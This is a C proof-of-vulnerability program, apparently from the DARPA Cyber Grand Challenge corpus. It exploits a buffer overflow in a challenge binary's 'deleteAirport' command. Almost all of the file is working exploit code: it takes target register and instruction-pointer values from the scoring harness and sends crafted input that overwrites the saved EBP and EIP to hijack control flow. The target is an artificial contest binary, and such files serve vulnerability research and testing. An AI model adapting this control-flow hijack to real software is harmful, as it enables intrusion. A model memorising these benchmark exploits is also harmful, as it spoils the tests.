/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>


int write( int fd, void *buffer, size_t count )
{
	size_t written;
    int total_written;
    int retval;

    written = 0;
    total_written = 0;

    while (total_written < count) {
	   retval=transmit(fd, buffer+total_written, count-total_written, &written);

       if (retval != 0)
            return(-1);

       total_written+=written;
    }

	return(count);
}


int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }
    }

	return 0;
}


int main(void)
{

char buffer[4];
char newEBP[4];
char newEIP[4];  

int pov_type;
int ip_mask;
int regmask;
int regnum;
unsigned int ipvalue;
unsigned int regvalue;

unsigned char exploit_buffer[24];

int value;

	pov_type = 1;

	// add masks to make sure we are null and newline safe
	ip_mask = 0x7f7f7f7f;
	regmask = 0x7f7f7f7f;
	regnum = 5;


	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
		_terminate(-1);

	if (write(3, &regmask, sizeof(regmask)) == -1)
		_terminate(-1);

	if (write(3, &regnum, sizeof(regnum)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &regvalue, sizeof(regnum)) == -1)
		_terminate(-1);


	// set the high bits to keep things null and newline safe
	regvalue |= 0x80808080;
	ipvalue |= 0x80808080;
	
	newEBP[0] = regvalue & 0xff;
	newEBP[1] = (regvalue >> 8) & 0xff;
	newEBP[2] = (regvalue >> 16) & 0xff;
	newEBP[3] = (regvalue >> 24) & 0xff;

	newEIP[0] = ipvalue & 0xff;
	newEIP[1] = (ipvalue >> 8) & 0xff;
	newEIP[2] = (ipvalue >> 16) & 0xff;
	newEIP[3] = (ipvalue >> 24) & 0xff;

	// perform the overwrite in the deleteAirport command
	write(1, "3/AAAAAAAA", 10);


	buffer[0] = 0x7c;
	buffer[1] = 0x2b;
	buffer[2] = 0x06;
	buffer[3] = 0x08;

	write(1, buffer, 4);
	write(1, buffer, 4);

	write(1, newEBP, 4);
	write(1, newEIP, 4);

	write(1, "\n", 1);

	// send an exit for the patched CB
	write(1, "13\n", 3);

}

